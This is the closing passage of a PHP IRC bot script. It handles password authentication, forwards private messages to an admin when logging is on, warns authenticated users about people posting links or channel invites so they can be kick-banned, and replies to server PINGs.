                                        } else { fputs($fp,'NOTICE '.$dNick.' :Please Auth First! Type: auth <your pass> To Authorized '. CRL); }
                                }
                                }
                                elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
                                        if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
                                                if (!ereg("#",$dCommand)) {
                                                        if ($log=="on") {
                                                                fputs($fp,'PRIVMSG '. $Admin .' : 4inviter: ' . $dFrom . ' 2:' .$iText. CRL);
                                                        }
                                                        $inv = strstr($dFrom,'@');
                                                        foreach ($auth as $user) {
                                                                if ($user["status"]=="user") {
                                                                        fputs($fp, 'NOTICE '.$user["name"].' : KB '.$chan.' '.$dNick.' '.$inv.' ' . CRL);
                                                                }
                                                        }
                                                }
                                        }
                                        elseif (!ereg("#",$dCommand)) {
                                                if ($log=="on") {
                                                        fputs($fp,'PRIVMSG '.$Admin.' : 6' . $dFrom . ' 12:' .$iText. CRL);
                                                }
                                        }
                                }
                                }
                        }
                        elseif (substr($data,0,4) == 'PING') {
                                fputs($fp,'PONG ' . substr($data,5) . CRL);
                        }
                }
        }
        fclose ($fp);
} while ($keluar==0);
}
cayank($nick);
?>
